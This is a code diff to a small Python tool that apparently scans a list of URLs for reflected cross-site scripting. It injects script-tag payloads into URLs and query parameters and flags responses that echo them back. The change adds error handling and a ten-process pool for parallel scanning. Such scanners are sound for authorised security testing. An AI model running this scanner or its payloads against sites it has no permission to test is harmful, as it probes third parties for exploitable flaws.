@@ -1,9 +1,10 @@
 #!/usr/bin/env python
 
 import requests
+from multiprocessing import Pool
 
-urls = [
-]
+
+urls = []
 
 attackPatterns = [
     '"><script>alert(\'XSS\');</script>',
@@ -15,12 +16,14 @@ attackPatterns = [
 class Url:
 
     def parseParameters(self, url):
-        url = url[url.find('?') + 1:]
-
         params = {}
 
-        for p in url.split('&'):
-            params[p.split('=')[0]] = p.split('=')[1]
+        if '?' in url:
+            url = url[url.find('?') + 1:]
+            
+            for p in url.split('&'):
+                if '=' in p:
+                    params[p.split('=')[0]] = p.split('=')[1]
 
         return params
 
@@ -90,23 +93,24 @@ def attack(url):
 
     for ap in attackPatterns:
         # attack plain get url
+        try:
+            r = requests.get(url.getUrl() + ap, timeout=10)
+            if ap in r.text:
+                res.addSuccessPatterns(url.getUrl() + ap)
 
-        r = requests.get(url.getUrl() + ap)
-        if ap in r.text:
-            res.addSuccessPatterns(url.getUrl() + ap, timeout=10)
+            # attack get parameters
+            injectedParameters = {}
 
-        # attack get parameters
-        injectedParameters = {}
+            for key, _ in url.parameters.items():
+                injectedParameters[key] = ap
+            url.setParamters(injectedParameters)
 
-        for key, _ in url.parameters.items():
-            injectedParameters[key] = ap
-        url.setParamters(injectedParameters)
+            r = requests.get(url.getUrl(), timeout=10)
 
-        r = requests.get(url.getUrl(), timeout=10)
-
-        if ap in r.text:
-            res.addSuccessPatterns(url.getUrl())
-
+            if ap in r.text:
+                res.addSuccessPatterns(url.getUrl())
+        except:
+            pass
     return res
 
 
@@ -116,16 +120,8 @@ def main():
     with open('urls.txt', 'r', encoding="utf-8", errors="surrogateescape") as infile:
         urls = [u.rstrip() for u in infile.readlines()]
 
-    for url in urls:
-        try:
-            res.append(attack(Url(url)))
-        except KeyboardInterrupt:
-            if input("quit?").lower() == 'y':
-                break
-            else:
-                continue
-        except:
-            pass
+    with Pool(processes=10) as pool:
+        res = pool.map(attack, [Url(url) for url in urls])
 
     buf = ''
     for r in res:
